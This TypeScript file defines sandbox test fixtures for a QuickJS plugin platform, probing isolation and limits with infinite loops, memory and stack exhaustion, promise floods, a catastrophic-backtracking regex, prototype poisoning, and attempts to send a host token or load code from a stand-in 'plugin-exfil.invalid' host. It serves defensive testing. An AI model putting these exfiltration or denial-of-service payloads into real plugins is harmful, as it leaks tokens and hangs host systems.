/** Fixed platform diagnostics only. These strings MUST only execute in QuickJS.
 * No upload field, query string source, remote endpoint, native eval or import.
 */
export const PROBE_FIXTURES = Object.freeze({
  healthy: `export function init(context) { return context.sdk.status.set("Welcome plugin initialized"); }
    export function onEvent(event, context) {
      if (event.type === "room.ready") return context.sdk.status.set(context.config.greeting || "Welcome");
    }
    export function dispose() {}`,
  globals: `export async function init(context) {
    for (const name of ["window", "document", "self", "parent", "fetch", "XMLHttpRequest", "WebSocket",
      "Worker", "importScripts", "navigator", "location", "localStorage", "sessionStorage", "process", "require",
      "roomToken", "adminToken", "mediaToken", "hostCanary", "setTimeout", "setInterval"]) {
      if (typeof globalThis[name] !== "undefined") throw new Error("ambient authority");
    }
    if (Function("return typeof process")() !== "undefined") throw null;
    try { fetch("https://plugin-exfil.invalid/steal?token=" + globalThis.hostCanary); } catch {}
    try { new WebSocket("wss://plugin-exfil.invalid/socket"); } catch {}
    try { new XMLHttpRequest().open("GET", "https://plugin-exfil.invalid/xhr"); } catch {}
    try { new Worker("https://plugin-exfil.invalid/worker"); } catch {}
    try { importScripts("https://plugin-exfil.invalid/script"); } catch {}
    try { document.location = "https://plugin-exfil.invalid/navigation"; } catch {}
    await context.sdk.status.set("VM globals and network unavailable");
  }`,
  loop: `export function init() { for (;;) {} }`,
  eventLoop: `export function init() {} export function onEvent() { for (;;) {} }`,
  disposeLoop: `export function init() {} export function dispose() { for (;;) {} }`,
  heap: `export function init() { globalThis.allocation = new ArrayBuffer(64 * 1024 * 1024); }`,
  heapLimit: `export function init() { globalThis.allocation = new ArrayBuffer(20 * 1024 * 1024); }`,
  stack: `function recurse() { return recurse() + 1; } export function init() { recurse(); }`,
  nativeJsonStack: `export function init() {
    JSON.parse("[".repeat(4000) + "0" + "]".repeat(4000));
  }`,
  nativeJoinStack: `export function init() {
    let value = ["x"]; for (let i = 0; i < 4000; i++) value = [value]; value.join();
  }`,
  promiseFlood: `export function init() { function spin() { Promise.resolve().then(spin); } spin(); }`,
  oversizeReturn: `export function init() { return "x".repeat(1024 * 1024); }`,
  oversizeSdk: `export function init(context) { context.sdk.status.set("x".repeat(1024 * 1024)); }`,
  accessor: `export function init() { return { get value() { for (;;) {} } }; }`,
  functionReturn: `export function init() { return function unexpected() {}; }`,
  symbolReturn: `export function init() { return Symbol("diagnostic"); }`,
  unsafeKey: `export function init() { return JSON.parse('{"__proto__":1}'); }`,
  toJSON: `export function init() { return { toJSON() { for (;;) {} } }; }`,
  prototype: `export function init() { return Object.create({ privileged: true }); }`,
  cycle: `export function init() { const value = {}; value.self = value; return value; }`,
  deep: `export function init() { let value = {}; for (let i = 0; i < 9; i++) value = { child: value }; return value; }`,
  nodes: `export function init() { return Array(300).fill(null); }`,
  exceptionGetter: `export function init(context) {
    context.sdk.status.set("MUST NOT COMMIT");
    throw { get message() { for (;;) {} }, get stack() { for (;;) {} }, toString() { for (;;) {} } };
  }`,
  exceptionProxy: `export function init() { throw new Proxy({}, { getPrototypeOf() { for (;;) {} } }); }`,
  serializerProxy: `export function init() { return new Proxy({}, { ownKeys() { for (;;) {} } }); }`,
  primordialTamper: `export function init(context) {
    const poison = () => { for (;;) {} };
    Reflect.apply = poison; Reflect.ownKeys = poison; Object.getOwnPropertyDescriptor = poison;
    Object.getPrototypeOf = poison; Object.freeze = poison; Object.defineProperty = poison;
    Array.prototype[Symbol.iterator] = poison; Array.prototype.push = poison;
    String.prototype.charCodeAt = poison; JSON.stringify = poison; JSON.parse = poison;
    Promise.resolve = poison; globalThis.String = poison;
    RegExp.prototype.exec = poison; RegExp.prototype.test = poison;
    return context.sdk.status.set("Captured primordials intact");
  }`,
  inheritedToJSON: `export function init(context) {
    Object.prototype.toJSON = () => { for (;;) {} };
    context.sdk.status.set("MUST NOT COMMIT");
  }`,
  descriptorPoison: `export function init() {
    Object.prototype.value = 42;
    return { get value() { for (;;) {} } };
  }`,
  bridgeFlood: `export async function init(context) {
    for (let i = 0; i < 11; i++) { try { await context.sdk.seating.cancelPendingOwnClaim(); } catch {} }
  }`,
  statusFlood: `export function init(context) { for (let i = 0; i < 3; i++) context.sdk.status.set("flood"); }`,
  failedAfterJobs: `export function init(context) {
    context.sdk.status.set("MUST NOT COMMIT");
    function spin() { Promise.resolve().then(spin); } spin();
  }`,
  staticImport: `import "https://plugin-exfil.invalid/module.js"; export function init() {}`,
  dynamicImport: `export async function init() { await import("https://plugin-exfil.invalid/module.js"); }`,
  generatedImport: `export async function init() { await eval('import("https://plugin-exfil.invalid/generated.js")'); }`,
  pending: `export async function init() { await new Promise(() => {}); }`,
  regex: `export function init() {} export function onEvent() { /^(a+)+$/.test("a".repeat(128) + "!"); }`,
  seatingDenied: `export async function init(context) {
    try { await context.sdk.seating.claimSelfOnEntry("seat-1"); throw new Error("fake seating success"); }
    catch (error) { if (error !== "capability-denied") throw error; }
    await context.sdk.status.set("Seating backend not integrated");
  }`
});
export type ProbeFixture = keyof typeof PROBE_FIXTURES;
